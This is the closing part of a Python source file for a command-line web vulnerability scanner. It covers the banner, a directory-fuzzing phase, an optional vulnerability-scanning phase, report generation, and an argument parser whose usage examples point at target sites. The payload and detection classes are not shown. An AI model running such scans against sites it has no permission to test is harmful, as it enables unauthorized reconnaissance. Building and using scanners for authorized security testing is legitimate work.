    {Colors.CYAN}├─ Advanced Directory Fuzzer{Colors.ENDC}
    {Colors.CYAN}├─ SQL Injection Scanner{Colors.ENDC}
    {Colors.CYAN}├─ XSS Vulnerability Detector{Colors.ENDC}
    {Colors.CYAN}├─ LFI/RFI Scanner{Colors.ENDC}
    {Colors.CYAN}├─ Sensitive File Detector{Colors.ENDC}
    {Colors.CYAN}└─ Comprehensive Report Generator{Colors.ENDC}

{Colors.YELLOW}[*] Target: {Colors.WHITE}{self.options['url']}{Colors.ENDC}
{Colors.YELLOW}[*] Wordlist: {Colors.WHITE}{self.options['wordlist']}{Colors.ENDC}
{Colors.YELLOW}[*] Threads: {Colors.WHITE}{self.options['threads']}{Colors.ENDC}
{Colors.YELLOW}[*] Timeout: {Colors.WHITE}{self.options['timeout']}s{Colors.ENDC}
"""
        print(banner)
    
    def scan(self):
        """Execute complete scan"""
        self.start_time = time.time()
        
        # Phase 1: Directory Fuzzing
        fuzzer = UltraDirectoryFuzzer(
            self.options['url'],
            self.options['wordlist'],
            self.options
        )
        found_paths = fuzzer.scan()
        self.results['found_paths'] = found_paths
        self.results['sensitive_files'] = fuzzer.sensitive_files
        
        # Phase 2: Vulnerability Scanning
        if self.options.get('vuln_scan'):
            vuln_scanner = VulnerabilityScanner(self.options['url'], self.options)
            vulnerabilities = vuln_scanner.scan_all(found_paths)
            self.results['vulnerabilities'] = vulnerabilities
        
        # Phase 3: Generate Reports
        duration = time.time() - self.start_time
        
        if self.options.get('output'):
            reporter = ReportGenerator(self.options.get('output_dir', 'output'))
            
            txt_report = reporter.generate_txt_report(
                self.options['url'],
                self.results['found_paths'],
                self.results['sensitive_files'],
                self.results['vulnerabilities'],
                duration
            )
            
            json_report = reporter.generate_json_report(
                self.options['url'],
                self.results['found_paths'],
                self.results['sensitive_files'],
                self.results['vulnerabilities'],
                duration
            )
            
            print(f"\n{Colors.GREEN}[✓] Reports Generated:{Colors.ENDC}")
            print(f"{Colors.CYAN}  ├─ Text Report: {txt_report}{Colors.ENDC}")
            print(f"{Colors.CYAN}  └─ JSON Report: {json_report}{Colors.ENDC}\n")
        
        # Final Summary
        self.print_final_summary(duration)
    
    def print_final_summary(self, duration):
        """Print final scan summary"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.GREEN}[✓] SCAN COMPLETED{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.ENDC}\n")
        
        print(f"{Colors.YELLOW}[*] Total Duration: {duration:.2f} seconds{Colors.ENDC}")
        print(f"{Colors.GREEN}[*] Paths Discovered: {len(self.results.get('found_paths') or [])}{Colors.ENDC}")
        print(f"{Colors.RED}[*] Sensitive Files: {len(self.results['sensitive_files'])}{Colors.ENDC}")
        print(f"{Colors.MAGENTA}[*] Vulnerabilities: {len(self.results['vulnerabilities'])}{Colors.ENDC}\n")
        
        # Severity breakdown
        if self.results['vulnerabilities']:
            severity_count = defaultdict(int)
            for vuln in self.results['vulnerabilities']:
                severity_count[vuln['severity']] += 1
            
            print(f"{Colors.BOLD}Vulnerability Severity Breakdown:{Colors.ENDC}")
            for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
                if severity in severity_count:
                    color = Colors.RED if severity == 'CRITICAL' else Colors.YELLOW
                    print(f"{color}  ├─ {severity}: {severity_count[severity]}{Colors.ENDC}")

# ════════════════════════════════════════════════════════════════════════════
#                           ARGUMENT PARSER
# ════════════════════════════════════════════════════════════════════════════

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description='Ultra Advanced Web Vulnerability Scanner v3.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""{Colors.CYAN}
Examples:
  Basic directory scan:
    python3 ultra_scanner.py -u https://target.com -w wordlist.txt
  
  Full vulnerability scan:
    python3 ultra_scanner.py -u https://target.com -w wordlist.txt --vuln -t 100
  
  Scan with custom extensions and output:
    python3 ultra_scanner.py -u https://target.com -w wordlist.txt -e php asp aspx -o report.txt
  
  Scan through proxy:
    python3 ultra_scanner.py -u https://target.com -w wordlist.txt --proxy http://127.0.0.1:8080
{Colors.ENDC}"""
    )
    
    # Required arguments
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-w', '--wordlist', required=True, help='Wordlist file path')
    
    # Optional arguments
    parser.add_argument('-t', '--threads', type=int, default=50, help='Number of threads (default: 50)')
    parser.add_argument('-o', '--output', help='Output file for reports')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
    parser.add_argument('--delay', type=float, default=0, help='Delay between requests (default: 0)')
    parser.add_argument('--retries', type=int, default=3, help='Max retries per request (default: 3)')
    
    # Extensions
    parser.add_argument('-e', '--extensions', nargs='+', help='File extensions to test')
    
    # Status codes
    parser.add_argument('--status-codes', nargs='+', type=int, help='Status codes to include')
    parser.add_argument('--exclude-codes', nargs='+', type=int, help='Status codes to exclude')
    
    # Scanning options
    parser.add_argument('--vuln', '--vuln-scan', action='store_true', dest='vuln_scan', help='Enable vulnerability scanning')
    parser.add_argument('--random-agent', action='store_true', help='Use random User-Agent')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    
    # Output options
    parser.add_argument('--output-dir', default='output', help='Output directory for reports')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
    
    return parser.parse_args()

# ════════════════════════════════════════════════════════════════════════════
#                              MAIN FUNCTION
# ════════════════════════════════════════════════════════════════════════════

def main():
    """Main entry point"""
    try:
        args = parse_arguments()
        
        # Build options dictionary
        options = {
            'url': args.url,
            'wordlist': args.wordlist,
            'threads': args.threads,
            'timeout': args.timeout,
            'delay': args.delay,
            'retries': args.retries,
            'extensions': args.extensions,
            'status_codes': args.status_codes,
            'exclude_codes': args.exclude_codes,
            'vuln_scan': args.vuln_scan,
            'random_agent': args.random_agent,
            'proxy': args.proxy,
            'output': args.output,
            'output_dir': args.output_dir,
            'verbose': args.verbose,
            'quiet': args.quiet
        }
        
        # Initialize and run scanner
        scanner = UltraScanner(options)
        scanner.print_banner()
        scanner.scan()
        
        print(f"\n{Colors.GREEN}[✓] All operations completed successfully!{Colors.ENDC}\n")
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.ENDC}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Fatal error: {e}{Colors.ENDC}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
